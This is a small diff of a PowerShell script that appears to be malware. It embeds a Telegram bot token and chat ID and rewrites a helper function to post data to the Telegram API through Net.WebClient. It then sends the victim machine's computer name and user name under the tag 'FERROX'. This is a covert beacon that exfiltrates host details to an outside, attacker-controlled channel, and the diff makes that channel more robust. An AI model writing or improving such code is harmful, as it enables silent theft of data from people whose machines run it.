@@ -3,9 +3,9 @@ $BT="8875226322:AAFsOazAfQOy5rlP1LQSM2JPX0YiPXQZPSM"
 $CI="8468737863"
 
 function TG($t){
-    $txt=$t -replace '#','%23' -replace '&','%26' -replace '\+','%2B'
-    $u="https://api.telegram.org/bot$BT/sendMessage?chat_id=$CI&text=$txt"
-    try{Invoke-WebRequest $u -UseBasicParsing -TimeoutSec 10|Out-Null}catch{}
+    $wc=New-Object Net.WebClient
+    $data="chat_id=$CI&text="+[uri]::EscapeDataString($t)
+    $wc.UploadString("https://api.telegram.org/bot$BT/sendMessage",$data)|Out-Null
 }
 
 TG "FERROX: $env:COMPUTERNAME / $env:USERNAME"
